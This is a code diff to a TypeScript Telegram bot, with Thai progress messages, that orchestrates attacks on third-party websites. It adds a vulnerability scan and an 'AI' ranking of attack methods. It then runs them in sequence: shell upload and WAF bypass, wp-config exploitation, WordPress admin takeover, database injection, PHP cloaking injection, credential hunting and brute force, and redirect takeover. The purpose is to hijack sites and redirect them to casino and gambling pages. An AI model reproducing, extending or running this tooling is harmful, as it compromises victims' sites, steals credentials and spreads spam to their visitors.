@@ -3417,7 +3417,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
     const { TelegramNarrator, generateReconAnalysis, generateCredentialAnalysis, generateHijackAnalysis, generateVerifyAnalysis, generateBruteForceAnalysis, generateUploadAnalysis } = await import("./telegram-narrator");
     
     if (method === "scan_only") {
-      // ═══ NARRATED SCAN ═══
+      // ═══ NARRATED DEEP VULNERABILITY SCAN ═══
       const narrator = new TelegramNarrator({
         domain,
         method: "scan_only",
@@ -3426,44 +3426,129 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         messageId: progressMsgId,
       });
       await narrator.init();
-      await narrator.startPhase("recon");
+      const scanStartTotal = Date.now();
       
-      // Step 1: HTTP check
-      const step1 = await narrator.addStep("ตรวจสอบ HTTP response + headers");
-      const scanStart = Date.now();
-      const { analyzeDomain } = await import("./seo-engine");
-      const analysis = await analyzeDomain(domain, "gambling");
-      const scanDuration = Date.now() - scanStart;
-      
-      await narrator.updateStep(step1, "done",
-        `DA:${analysis.currentState.estimatedDA} | DR:${analysis.currentState.estimatedDR} | BL:${analysis.currentState.estimatedBacklinks}`,
-        scanDuration
-      );
-      timings.push({ step: "Domain Analysis", ms: scanDuration, ok: true });
+      // Phase 1: Basic domain analysis (SEO metrics)
+      await narrator.startPhase("recon", "🔍 วิเคราะห์โดเมนเบื้องต้น");
+      const step1 = await narrator.addStep("ตรวจสอบ SEO metrics (DA/DR/Backlinks)");
+      const seoStart = Date.now();
+      let seoData: any = null;
+      try {
+        const { analyzeDomain } = await import("./seo-engine");
+        seoData = await analyzeDomain(domain, "gambling");
+        await narrator.updateStep(step1, "done",
+          `DA:${seoData.currentState.estimatedDA} | DR:${seoData.currentState.estimatedDR} | BL:${seoData.currentState.estimatedBacklinks}`,
+          Date.now() - seoStart
+        );
+        await narrator.addAnalysis(
+          `เว็บไซต์ ${domain}:\n` +
+          `• DA=${seoData.currentState.estimatedDA} DR=${seoData.currentState.estimatedDR}\n` +
+          `• Backlinks: ${seoData.currentState.estimatedBacklinks}\n` +
+          `• Google Index: ${seoData.currentState.isIndexed ? "✅ อยู่ใน Google" : "❌ ไม่อยู่ใน Google"}`
+        );
+        timings.push({ step: "SEO Analysis", ms: Date.now() - seoStart, ok: true });
+      } catch (seoErr: any) {
+        await narrator.updateStep(step1, "failed", `SEO scan error: ${seoErr.message?.substring(0, 50) || "unknown"}`, Date.now() - seoStart);
+        timings.push({ step: "SEO Analysis failed", ms: Date.now() - seoStart, ok: false });
+      }
       stepIndex++;
       
-      // Step 2: WP endpoints
-      const step2 = await narrator.addStep("ตรวจสอบ WP endpoints (xmlrpc, REST API, wp-admin)");
-      await narrator.updateStep(step2, "done",
-        `Indexed: ${analysis.currentState.isIndexed ? "✅ อยู่ใน Google" : "❌ ไม่อยู่ใน Google"}`
-      );
-      timings.push({ step: `DA:${analysis.currentState.estimatedDA} DR:${analysis.currentState.estimatedDR} BL:${analysis.currentState.estimatedBacklinks}`, ms: 0, ok: true });
+      // Phase 2: Deep Vulnerability Scan (fullVulnScan)
+      await narrator.startPhase("vulnscan", "🔬 Deep Vulnerability Scan");
+      const vulnStep = await narrator.addStep("🖥️ สแกนเซิร์ฟเวอร์ + CMS + WAF + ช่องโหว่");
+      const vulnStart = Date.now();
+      let vulnScanResult: any = null;
+      try {
+        const { fullVulnScan } = await import("./ai-vuln-analyzer");
+        const { generateVulnScanAnalysis } = await import("./telegram-narrator");
+        vulnScanResult = await fullVulnScan(domain, (stage, detail) => {
+          try { narrator.addStep(`🔎 ${detail.substring(0, 55)}`).catch(() => {}); } catch {}
+        });
+        const vulnMs = Date.now() - vulnStart;
+        await narrator.updateStep(vulnStep, "done",
+          `Server: ${vulnScanResult.serverInfo.server} | CMS: ${vulnScanResult.cms.type} | WAF: ${vulnScanResult.serverInfo.waf || "ไม่พบ"} | Vulns: ${vulnScanResult.misconfigurations.filter((m: any) => m.exploitable).length}`,
+          vulnMs
+        );
+        
+        // Show detailed analysis from generateVulnScanAnalysis
+        const vulnAnalysisText = generateVulnScanAnalysis({
+          serverInfo: vulnScanResult.serverInfo,
+          cms: vulnScanResult.cms,
+          writablePaths: vulnScanResult.writablePaths,
+          uploadEndpoints: vulnScanResult.uploadEndpoints,
+          exposedPanels: vulnScanResult.exposedPanels,
+          misconfigurations: vulnScanResult.misconfigurations,
+          attackVectors: vulnScanResult.attackVectors,
+          totalVulns: vulnScanResult.misconfigurations.length,
+          criticalVulns: vulnScanResult.misconfigurations.filter((m: any) => m.severity === "critical").length,
+          highVulns: vulnScanResult.misconfigurations.filter((m: any) => m.severity === "high").length,
+          exploitableVulns: vulnScanResult.misconfigurations.filter((m: any) => m.exploitable).length,
+          scanDuration: vulnMs,
+        });
+        await narrator.addAnalysis(vulnAnalysisText);
+        
+        // Show AI attack plan
+        if (vulnScanResult.attackVectors.length > 0) {
+          await narrator.addAnalysis(
+            `🎯 AI แผนโจมตีแนะนำ:\n` +
+            vulnScanResult.attackVectors.slice(0, 5).map((v: any, i: number) =>
+              `${i + 1}. ${v.name} (${Math.round(v.successProbability * 100)}%) — ${v.technique || v.method || ""}`
+            ).join("\n")
+          );
+        }
+        
+        timings.push({ step: `Deep Vuln Scan: ${vulnScanResult.attackVectors.length} vectors, ${vulnScanResult.writablePaths.length} writable`, ms: vulnMs, ok: true });
+      } catch (vulnErr: any) {
+        await narrator.updateStep(vulnStep, "failed", `Vuln scan error: ${vulnErr.message?.substring(0, 50) || "unknown"}`, Date.now() - vulnStart);
+        await narrator.addAnalysis(`⚠️ Deep scan ล้มเหลว: ${vulnErr.message?.substring(0, 80) || "unknown error"}`);
+        timings.push({ step: "Deep Vuln Scan failed", ms: Date.now() - vulnStart, ok: false });
+      }
       stepIndex++;
       
-      // Step 3: Analysis summary
-      const step3 = await narrator.addStep("วิเคราะห์ผลสแกน");
-      await narrator.addAnalysis(
-        `พบว่าเว็บไซต์ ${domain} มี DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} ` +
-        `มี backlinks ประมาณ ${analysis.currentState.estimatedBacklinks} ` +
-        `${analysis.currentState.isIndexed ? "อยู่ใน Google index แล้ว — เหมาะสำหรับ SEO parasite" : "ยังไม่อยู่ใน Google index"}`
-      );
-      await narrator.updateStep(step3, "done");
-      timings.push({ step: `Indexed: ${analysis.currentState.isIndexed ? "Yes" : "No"}`, ms: 0, ok: true });
+      // Phase 3: Summary & Recommendations
+      await narrator.startPhase("verify", "✅ สรุปผลการสแกน");
+      const summaryStep = await narrator.addStep("สรุปและคำแนะนำ");
+      
+      // Build recommendation text
+      const recommendations: string[] = [];
+      if (vulnScanResult) {
+        const exploitable = vulnScanResult.misconfigurations.filter((m: any) => m.exploitable).length;
+        const writable = vulnScanResult.writablePaths.length;
+        const uploads = vulnScanResult.uploadEndpoints?.length || 0;
+        const vectors = vulnScanResult.attackVectors.length;
+        
+        if (exploitable > 0 || writable > 0 || uploads > 0) {
+          recommendations.push(`✅ เว็บนี้มีช่องโหว่ — แนะนำใช้ full_chain เพื่อโจมตีเต็มรูปแบบ`);
+        } else if (vectors > 0) {
+          recommendations.push(`⚠️ พบช่องทางโจมตีบางส่วน — แนะนำใช้ agentic_auto เพื่อให้ AI วิเคราะห์และเลือกวิธีเอง`);
+        } else {
+          recommendations.push(`❌ ไม่พบช่องโหว่ชัดเจน — อาจลอง hijack_redirect หรือ cloaking_inject`);
+        }
+        if (vulnScanResult.serverInfo.waf) {
+          recommendations.push(`🛡️ พบ WAF (${vulnScanResult.serverInfo.waf}) — อาจต้อง bypass`);
+        }
+        if (vulnScanResult.cms.type === "wordpress") {
+          recommendations.push(`📝 WordPress — เหมาะกับ cloaking_inject หรือ full_chain`);
+        }
+      } else {
+        recommendations.push(`⚠️ Deep scan ล้มเหลว — แนะนำลอง full_chain หรือ agentic_auto เพื่อโจมตีโดยตรง`);
+      }
+      if (seoData) {
+        const da = seoData.currentState.estimatedDA;
+        if (da >= 30) recommendations.push(`📈 DA ${da} สูง — เหมาะสำหรับ SEO parasite`);
+      }
+      
+      await narrator.addAnalysis(recommendations.join("\n"));
+      await narrator.updateStep(summaryStep, "done");
       stepIndex++;
+      
+      const totalScanMs = Date.now() - scanStartTotal;
       
       // Complete
       await narrator.complete(true,
-        `Scan เสร็จ: DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} BL=${analysis.currentState.estimatedBacklinks}`
+        `Deep Scan เสร็จ (${(totalScanMs / 1000).toFixed(1)}s)` +
+        (seoData ? ` | DA:${seoData.currentState.estimatedDA} DR:${seoData.currentState.estimatedDR}` : "") +
+        (vulnScanResult ? ` | Vulns:${vulnScanResult.misconfigurations.filter((m: any) => m.exploitable).length} Vectors:${vulnScanResult.attackVectors.length}` : "")
       );
       
       // Save scan log
@@ -3471,9 +3556,21 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         targetDomain: domain,
         method: "scan_only",
         success: true,
-        durationMs: scanDuration,
-        aiReasoning: `Scan complete: DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} BL=${analysis.currentState.estimatedBacklinks}`,
-        preAnalysisData: analysis.currentState,
+        durationMs: totalScanMs,
+        aiReasoning: `Deep Scan complete: ` +
+          (seoData ? `DA=${seoData.currentState.estimatedDA} DR=${seoData.currentState.estimatedDR} BL=${seoData.currentState.estimatedBacklinks} ` : "") +
+          (vulnScanResult ? `Vectors:${vulnScanResult.attackVectors.length} Writable:${vulnScanResult.writablePaths.length} Exploitable:${vulnScanResult.misconfigurations.filter((m: any) => m.exploitable).length}` : "Vuln scan failed"),
+        preAnalysisData: {
+          ...(seoData?.currentState || {}),
+          vulnScan: vulnScanResult ? {
+            attackVectors: vulnScanResult.attackVectors.slice(0, 5).map((v: any) => v.name),
+            writablePaths: vulnScanResult.writablePaths.length,
+            exploitable: vulnScanResult.misconfigurations.filter((m: any) => m.exploitable).length,
+            server: vulnScanResult.serverInfo.server,
+            cms: vulnScanResult.cms.type,
+            waf: vulnScanResult.serverInfo.waf,
+          } : null,
+        },
       });
       
     } else if (method === "redirect_only") {
@@ -3667,226 +3764,254 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       stepIndex++;
       
-      // ===== CASCADING ATTACK METHODS =====
-      // Try each method in order until one succeeds
+      // ===== CASCADING ATTACK METHODS (AI-ORDERED) =====
+      // Use attackVectors from scan to determine optimal order
       let fullChainSuccess = false;
       let successMethod = "";
       let successUrl = "";
       const failedMethods: string[] = [];
       
-      // Method 1: Unified Pipeline
-      await narrator.startPhase("exploit", "💥 วิธีที่ 1: Unified Attack Pipeline");
-      const s2 = Date.now();
-      try {
-        const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
-        let lastPhaseForProgress = "";
-        const pipelineResult = await runUnifiedAttackPipeline(
-          {
-            targetUrl: `https://${domain}`,
-            redirectUrl,
-            seoKeywords: ["casino", "gambling", "slots"],
-            enableCloaking: true,
-            enableWafBypass: true,
-            enableAltUpload: true,
-            enableIndirectAttacks: true,
-            enableDnsAttacks: true,
-            enableConfigExploit: true,
-            enableWpAdminTakeover: true,
-            enableWpDbInjection: true,
-            enableAiCommander: true,
-            enableComprehensiveAttacks: true,
-            enablePostUpload: true,
-            userId: 1,
-            globalTimeout: 8 * 60 * 1000,
-          },
-          async (event) => {
-            if (event.phase !== lastPhaseForProgress) {
-              if (lastPhaseForProgress) {
-                await narrator.completeLastStep(event.detail.includes("❌") ? "failed" : "done", event.detail.substring(0, 80));
+      // Define available attack methods
+      type AttackMethodDef = {
+        id: string;
+        name: string;
+        phase: "exploit" | "inject" | "hijack";
+        icon: string;
+        keywords: string[]; // keywords to match from attackVector name/technique
+      };
+      const ALL_METHODS: AttackMethodDef[] = [
+        { id: "pipeline", name: "Unified Attack Pipeline", phase: "exploit", icon: "💥", keywords: ["upload", "put", "post", "webdav", "writable", "form", "multipart"] },
+        { id: "cloaking", name: "PHP Cloaking Injection", phase: "inject", icon: "💊", keywords: ["cloaking", "php", "inject", "htaccess", "functions.php"] },
+        { id: "hijack", name: "Hijack Redirect", phase: "hijack", icon: "🔓", keywords: ["credential", "brute", "xmlrpc", "ftp", "mysql", "phpmyadmin", "cpanel", "takeover"] },
+        { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", phase: "exploit", icon: "🚀", keywords: ["parasite", "doorway", "play store", "apk", "seo"] },
+        { id: "redirect", name: "Redirect Takeover ตรง", phase: "hijack", icon: "🎯", keywords: ["redirect", "301", "302", "meta refresh", "javascript redirect"] },
+      ];
+      
+      // Build dynamic order from scan results
+      let methodOrder: string[] = [];
+      if (vulnScanResult && vulnScanResult.attackVectors.length > 0) {
+        // Score each method based on matching attackVectors
+        const methodScores = new Map<string, number>();
+        for (const m of ALL_METHODS) methodScores.set(m.id, 0);
+        
+        for (const vec of vulnScanResult.attackVectors) {
+          const vecText = `${vec.name} ${vec.technique} ${vec.method} ${vec.payloadType}`.toLowerCase();
+          for (const m of ALL_METHODS) {
+            for (const kw of m.keywords) {
+              if (vecText.includes(kw)) {
+                methodScores.set(m.id, (methodScores.get(m.id) || 0) + vec.successProbability);
+                break;
               }
-              lastPhaseForProgress = event.phase;
-              const phaseLabels: Record<string, string> = {
-                ai_analysis: "🤖 AI วิเคราะห์", prescreen: "🔍 Pre-screen", vuln_scan: "🔎 สแกนช่องโหว่",
-                shell_gen: "🛠 สร้าง Shell", upload: "📤 อัปโหลด", verify: "✅ ตรวจสอบ",
-                waf_bypass: "🛡 Bypass WAF", alt_upload: "📤 ทางเลือก", indirect: "🔄 ทางอ้อม",
-                dns_attack: "🌐 DNS", config_exploit: "⚙️ wp-config", cloaking: "🎭 Cloaking",
-                wp_admin: "🔐 WP Admin", wp_db_inject: "💉 DB Inject", wp_brute_force: "🔨 Brute Force",
-                post_upload: "📝 Post Upload", comprehensive: "💥 Comprehensive", smart_fallback: "🧠 Fallback",
-                cf_bypass: "☁️ CF Bypass", shellless: "🚫 Shellless",
-                error: "❌ Error", failed: "❌ Failed", complete: "🏁 Done", success: "✅ Success",
-                world_update: "📡 Update", ai_retry: "🧠 AI Retry",
-              };
-              const thaiLabel = phaseLabels[event.phase] || `📋 ${event.phase}`;
-              const isErr = event.phase === "error" || (event.phase as string) === "failed" || event.detail.includes("❌");
-              await narrator.addStep(thaiLabel);
-              await narrator.completeLastStep(isErr ? "failed" : "done");
-              timings.push({ step: `Pipeline.${event.phase}`, ms: Date.now() - s2, ok: !isErr });
-              stepIndex++;
             }
-            if (event.detail.length > 20) {
-              const thai = translatePipelineEvent(event.phase, event.detail);
-              if (thai) { try { await narrator.addAnalysis(thai); } catch {} }
-            }
-          },
-        );
-        if (lastPhaseForProgress) await narrator.completeLastStep("done");
-        const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
-        const anyRedirect = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
-        if (pipelineResult.success || verifiedFiles.length > 0 || anyRedirect) {
-          fullChainSuccess = true;
-          successMethod = "Unified Pipeline";
-          successUrl = verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url || "";
-          await narrator.addAnalysis(`✅ Pipeline สำเร็จ! ${pipelineResult.shellsGenerated} shells, ${verifiedFiles.length} verified files`);
-        } else {
-          failedMethods.push(`Pipeline (${pipelineResult.errors.slice(0, 1).join(", ") || "no redirect"})`);
-          await narrator.addAnalysis(`❌ Pipeline ล้มเหลว — ลองวิธีถัดไป...`);
-        }
-      } catch (pipeErr: any) {
-        failedMethods.push(`Pipeline (${pipeErr.message?.substring(0, 40) || "error"})`);
-        await narrator.addAnalysis(`❌ Pipeline error: ${pipeErr.message?.substring(0, 60) || "unknown"} — ลองวิธีถัดไป...`);
-      }
-      timings.push({ step: "Method 1: Pipeline", ms: Date.now() - s2, ok: fullChainSuccess });
-      
-      // Method 2: PHP Cloaking Injection
-      if (!fullChainSuccess) {
-        await narrator.startPhase("inject", "💊 วิธีที่ 2: PHP Cloaking Injection");
-        const s3 = Date.now();
-        try {
-          const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
-          const injResult = await executePhpInjectionAttack({
-            targetUrl: `https://${domain}`,
-            redirectUrl,
-            targetLanguages: ["th", "vi"],
-            brandName: "casino",
-          }, async (detail) => {
-            try { await narrator.addStep(detail.substring(0, 60)); } catch {}
-          });
-          if (injResult.success) {
-            fullChainSuccess = true;
-            successMethod = "PHP Cloaking";
-            successUrl = injResult.injectedFile || injResult.externalJsUrl || "";
-            await narrator.addAnalysis(`✅ Cloaking สำเร็จ! Method: ${injResult.method}, File: ${injResult.injectedFile?.substring(0, 60) || "OK"}`);
-          } else {
-            failedMethods.push(`Cloaking (${injResult.errors?.slice(0, 1).join(", ") || "failed"})`);
-            await narrator.addAnalysis(`❌ Cloaking ล้มเหลว — ลองวิธีถัดไป...`);
           }
-        } catch (cloakErr: any) {
-          failedMethods.push(`Cloaking (${cloakErr.message?.substring(0, 30) || "error"})`);
-          await narrator.addAnalysis(`❌ Cloaking error — ลองวิธีถัดไป...`);
         }
-        timings.push({ step: "Method 2: Cloaking", ms: Date.now() - s3, ok: fullChainSuccess });
+        
+        // Sort by score descending, keep all methods
+        methodOrder = ALL_METHODS
+          .map(m => ({ id: m.id, score: methodScores.get(m.id) || 0 }))
+          .sort((a, b) => b.score - a.score)
+          .map(m => m.id);
+        
+        await narrator.addAnalysis(
+          `🧠 AI จัดลำดับโจมตีตามผล scan:\n` +
+          methodOrder.map((id, i) => {
+            const m = ALL_METHODS.find(x => x.id === id)!;
+            const score = methodScores.get(id) || 0;
+            return `${i + 1}. ${m.icon} ${m.name} (score: ${score.toFixed(1)})`;
+          }).join("\n")
+        );
+      } else {
+        // Fallback: fixed order
+        methodOrder = ["pipeline", "cloaking", "hijack", "advanced", "redirect"];
+        await narrator.addAnalysis(`⚠️ ไม่มีข้อมูล scan — ใช้ลำดับเริ่มต้น: Pipeline → Cloaking → Hijack → Advanced → Redirect`);
       }
       
-      // Method 3: Hijack Redirect (Credential Hunter + 6 methods)
-      if (!fullChainSuccess) {
-        await narrator.startPhase("hijack", "🔓 วิธีที่ 3: Hijack Redirect");
-        const s4 = Date.now();
+      // Execute methods in AI-determined order
+      for (let mi = 0; mi < methodOrder.length && !fullChainSuccess; mi++) {
+        const methodId = methodOrder[mi];
+        const methodDef = ALL_METHODS.find(m => m.id === methodId)!;
+        await narrator.startPhase(methodDef.phase, `${methodDef.icon} วิธีที่ ${mi + 1}: ${methodDef.name}`);
+        const methodStart = Date.now();
+        
         try {
-          // 3a: Credential Hunt
-          const credStep = await narrator.addStep("🔑 AI Credential Hunter");
-          let huntedCreds: Array<{ username: string; password: string }> = [];
-          try {
-            const { executeCredentialHunt } = await import("./ai-credential-hunter");
-            const huntResult = await executeCredentialHunt({
-              domain,
-              maxDurationMs: 45_000,
-              onProgress: async (phase, detail) => {
-                try { await narrator.addStep(`🔑 ${detail.substring(0, 60)}`); } catch {}
+          if (methodId === "pipeline") {
+            // ── Unified Pipeline ──
+            const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
+            let lastPhaseForProgress = "";
+            const pipelineResult = await runUnifiedAttackPipeline(
+              {
+                targetUrl: `https://${domain}`,
+                redirectUrl,
+                seoKeywords: ["casino", "gambling", "slots"],
+                enableCloaking: true,
+                enableWafBypass: true,
+                enableAltUpload: true,
+                enableIndirectAttacks: true,
+                enableDnsAttacks: true,
+                enableConfigExploit: true,
+                enableWpAdminTakeover: true,
+                enableWpDbInjection: true,
+                enableAiCommander: true,
+                enableComprehensiveAttacks: true,
+                enablePostUpload: true,
+                userId: 1,
+                globalTimeout: 8 * 60 * 1000,
+              },
+              async (event) => {
+                if (event.phase !== lastPhaseForProgress) {
+                  if (lastPhaseForProgress) {
+                    await narrator.completeLastStep(event.detail.includes("❌") ? "failed" : "done", event.detail.substring(0, 80));
+                  }
+                  lastPhaseForProgress = event.phase;
+                  const phaseLabels: Record<string, string> = {
+                    ai_analysis: "🤖 AI วิเคราะห์", prescreen: "🔍 Pre-screen", vuln_scan: "🔎 สแกนช่องโหว่",
+                    shell_gen: "🛠 สร้าง Shell", upload: "📤 อัปโหลด", verify: "✅ ตรวจสอบ",
+                    waf_bypass: "🛡 Bypass WAF", alt_upload: "📤 ทางเลือก", indirect: "🔄 ทางอ้อม",
+                    dns_attack: "🌐 DNS", config_exploit: "⚙️ wp-config", cloaking: "🎭 Cloaking",
+                    wp_admin: "🔐 WP Admin", wp_db_inject: "💉 DB Inject", wp_brute_force: "🔨 Brute Force",
+                    post_upload: "📝 Post Upload", comprehensive: "💥 Comprehensive", smart_fallback: "🧠 Fallback",
+                    cf_bypass: "☁️ CF Bypass", shellless: "🚫 Shellless",
+                    error: "❌ Error", failed: "❌ Failed", complete: "🏁 Done", success: "✅ Success",
+                    world_update: "📡 Update", ai_retry: "🧠 AI Retry",
+                  };
+                  const thaiLabel = phaseLabels[event.phase] || `📋 ${event.phase}`;
+                  const isErr = event.phase === "error" || (event.phase as string) === "failed" || event.detail.includes("❌");
+                  await narrator.addStep(thaiLabel);
+                  await narrator.completeLastStep(isErr ? "failed" : "done");
+                  timings.push({ step: `Pipeline.${event.phase}`, ms: Date.now() - methodStart, ok: !isErr });
+                  stepIndex++;
+                }
+                if (event.detail.length > 20) {
+                  const thai = translatePipelineEvent(event.phase, event.detail);
+                  if (thai) { try { await narrator.addAnalysis(thai); } catch {} }
+                }
+              },
+            );
+            if (lastPhaseForProgress) await narrator.completeLastStep("done");
+            const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
+            const anyRedirect = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
+            if (pipelineResult.success || verifiedFiles.length > 0 || anyRedirect) {
+              fullChainSuccess = true;
+              successMethod = "Unified Pipeline";
+              successUrl = verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url || "";
+              await narrator.addAnalysis(`✅ Pipeline สำเร็จ! ${pipelineResult.shellsGenerated} shells, ${verifiedFiles.length} verified files`);
+            } else {
+              failedMethods.push(`Pipeline (${pipelineResult.errors.slice(0, 1).join(", ") || "no redirect"})`);
+              await narrator.addAnalysis(`❌ Pipeline ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "cloaking") {
+            // ── PHP Cloaking Injection ──
+            const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
+            const injResult = await executePhpInjectionAttack({
+              targetUrl: `https://${domain}`,
+              redirectUrl,
+              targetLanguages: ["th", "vi"],
+              brandName: "casino",
+            }, async (detail) => {
+              try { await narrator.addStep(detail.substring(0, 60)); } catch {}
+            });
+            if (injResult.success) {
+              fullChainSuccess = true;
+              successMethod = "PHP Cloaking";
+              successUrl = injResult.injectedFile || injResult.externalJsUrl || "";
+              await narrator.addAnalysis(`✅ Cloaking สำเร็จ! Method: ${injResult.method}, File: ${injResult.injectedFile?.substring(0, 60) || "OK"}`);
+            } else {
+              failedMethods.push(`Cloaking (${injResult.errors?.slice(0, 1).join(", ") || "failed"})`);
+              await narrator.addAnalysis(`❌ Cloaking ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "hijack") {
+            // ── Hijack Redirect (Credential Hunter + 6 methods) ──
+            // Credential Hunt
+            const credStep = await narrator.addStep("🔑 AI Credential Hunter");
+            let huntedCreds: Array<{ username: string; password: string }> = [];
+            try {
+              const { executeCredentialHunt } = await import("./ai-credential-hunter");
+              const huntResult = await executeCredentialHunt({
+                domain,
+                maxDurationMs: 45_000,
+                onProgress: async (phase, detail) => {
+                  try { await narrator.addStep(`🔑 ${detail.substring(0, 60)}`); } catch {}
+                },
+              });
+              huntedCreds = huntResult.credentials.slice(0, 100).map(c => ({ username: c.username, password: c.password }));
+              await narrator.updateStep(credStep, huntedCreds.length > 0 ? "done" : "failed",
+                `พบ ${huntedCreds.length} credentials`,
+                Date.now() - methodStart
+              );
+            } catch {
+              await narrator.updateStep(credStep, "failed", "Credential hunt failed");
+            }
+            
+            // Redirect Takeover
+            const takeoverStep = await narrator.addStep("🔓 Redirect Takeover (6 วิธี)");
+            const { executeRedirectTakeover } = await import("./redirect-takeover");
+            const hijackResults = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
+            const hijackSucceeded = hijackResults.filter(r => r.success);
+            for (const r of hijackResults) {
+              await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
+              await narrator.completeLastStep(r.success ? "done" : "failed");
+            }
+            if (hijackSucceeded.length > 0) {
+              fullChainSuccess = true;
+              successMethod = `Hijack (${hijackSucceeded.map(r => r.method).join(", ")})`;
+              successUrl = hijackSucceeded[0]?.injectedUrl || "";
+              await narrator.addAnalysis(`✅ Hijack สำเร็จด้วย ${hijackSucceeded.map(r => r.method).join(", ")}`);
+            } else {
+              failedMethods.push(`Hijack (0/${hijackResults.length})`);
+              await narrator.addAnalysis(`❌ Hijack ล้มเหลวทั้ง ${hijackResults.length} วิธี — ลองวิธีถัดไป...`);
+            }
+            await narrator.updateStep(takeoverStep, hijackSucceeded.length > 0 ? "done" : "failed",
+              `${hijackSucceeded.length}/${hijackResults.length} สำเร็จ`,
+              Date.now() - methodStart
+            );
+            
+          } else if (methodId === "advanced") {
+            // ── Advanced Deploy (5 techniques) ──
+            const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
+            const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
+              userId: 1,
+              onProgress: async (event) => {
+                try { await narrator.addStep(event.detail.substring(0, 60)); } catch {}
               },
             });
-            huntedCreds = huntResult.credentials.slice(0, 100).map(c => ({ username: c.username, password: c.password }));
-            await narrator.updateStep(credStep, huntedCreds.length > 0 ? "done" : "failed",
-              `พบ ${huntedCreds.length} credentials`,
-              Date.now() - s4
-            );
-          } catch {
-            await narrator.updateStep(credStep, "failed", "Credential hunt failed");
+            const advVerified = deployment.deployedUrls.filter((u: { url: string; type: string; verified: boolean }) => u.verified);
+            if (advVerified.length > 0 || deployment.verifiedFiles > 0) {
+              fullChainSuccess = true;
+              successMethod = `Advanced Deploy (${deployment.methodsUsed.join(", ")})`;
+              successUrl = advVerified[0]?.url || deployment.deployedUrls[0]?.url || "";
+              await narrator.addAnalysis(`✅ Advanced Deploy สำเร็จ! ${deployment.verifiedFiles}/${deployment.totalFiles} verified, methods: ${deployment.methodsUsed.join(", ")}`);
+            } else {
+              failedMethods.push(`Advanced (${deployment.deployedFiles}/${deployment.totalFiles} deployed, 0 verified)`);
+              await narrator.addAnalysis(`❌ Advanced Deploy ล้มเหลว — ลองวิธีถัดไป...`);
+            }
+            
+          } else if (methodId === "redirect") {
+            // ── Redirect Takeover (direct, no creds) ──
+            const { executeRedirectTakeover } = await import("./redirect-takeover");
+            const rtResults = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
+            const rtSucceeded = rtResults.filter(r => r.success);
+            for (const r of rtResults) {
+              await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
+              await narrator.completeLastStep(r.success ? "done" : "failed");
+            }
+            if (rtSucceeded.length > 0) {
+              fullChainSuccess = true;
+              successMethod = `Redirect Takeover (${rtSucceeded.map(r => r.method).join(", ")})`;
+              successUrl = rtSucceeded[0]?.injectedUrl || "";
+              await narrator.addAnalysis(`✅ Redirect Takeover สำเร็จ!`);
+            } else {
+              failedMethods.push(`Redirect (0/${rtResults.length})`);
+              await narrator.addAnalysis(`❌ Redirect Takeover ล้มเหลวทั้งหมด`);
+            }
           }
-          
-          // 3b: Redirect Takeover
-          const takeoverStep = await narrator.addStep("🔓 Redirect Takeover (6 วิธี)");
-          const { executeRedirectTakeover } = await import("./redirect-takeover");
-          const hijackResults = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
-          const hijackSucceeded = hijackResults.filter(r => r.success);
-          for (const r of hijackResults) {
-            await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
-            await narrator.completeLastStep(r.success ? "done" : "failed");
-          }
-          if (hijackSucceeded.length > 0) {
-            fullChainSuccess = true;
-            successMethod = `Hijack (${hijackSucceeded.map(r => r.method).join(", ")})`;
-            successUrl = hijackSucceeded[0]?.injectedUrl || "";
-            await narrator.addAnalysis(`✅ Hijack สำเร็จด้วย ${hijackSucceeded.map(r => r.method).join(", ")}`);
-          } else {
-            failedMethods.push(`Hijack (0/${hijackResults.length})`);
-            await narrator.addAnalysis(`❌ Hijack ล้มเหลวทั้ง ${hijackResults.length} วิธี — ลองวิธีถัดไป...`);
-          }
-          await narrator.updateStep(takeoverStep, hijackSucceeded.length > 0 ? "done" : "failed",
-            `${hijackSucceeded.length}/${hijackResults.length} สำเร็จ`,
-            Date.now() - s4
-          );
-        } catch (hijackErr: any) {
-          failedMethods.push(`Hijack (${hijackErr.message?.substring(0, 30) || "error"})`);
-          await narrator.addAnalysis(`❌ Hijack error — ลองวิธีถัดไป...`);
+        } catch (methodErr: any) {
+          failedMethods.push(`${methodDef.name} (${methodErr.message?.substring(0, 40) || "error"})`);
+          await narrator.addAnalysis(`❌ ${methodDef.name} error: ${methodErr.message?.substring(0, 60) || "unknown"} — ลองวิธีถัดไป...`);
         }
-        timings.push({ step: "Method 3: Hijack", ms: Date.now() - s4, ok: fullChainSuccess });
-      }
-      
-      // Method 4: Advanced Deploy (5 techniques)
-      if (!fullChainSuccess) {
-        await narrator.startPhase("exploit", "🚀 วิธีที่ 4: Advanced Deploy (5 เทคนิค)");
-        const s5 = Date.now();
-        try {
-          const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
